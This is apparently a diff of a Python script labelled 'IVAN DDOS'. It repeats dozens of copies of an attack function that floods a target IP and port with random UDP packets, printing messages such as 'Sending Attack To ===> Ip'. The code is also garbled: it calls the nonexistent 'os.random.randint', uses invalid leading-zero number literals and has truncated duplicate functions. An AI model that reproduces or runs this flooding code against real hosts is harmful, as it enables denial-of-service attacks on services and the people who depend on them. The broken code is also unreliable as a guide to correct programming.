-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -29419,225 +20425,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30013,7 +20801,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30045,7 +20833,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30077,7 +20865,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30109,7 +20897,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30141,7 +20929,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30167,7 +20955,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30199,39 +20987,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30263,7 +21019,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30295,415 +21051,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -30735,225 +21083,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31329,7 +21459,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31361,7 +21491,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31393,7 +21523,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31425,7 +21555,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31457,7 +21587,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31483,7 +21613,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31515,7 +21645,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -31547,7 +21677,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
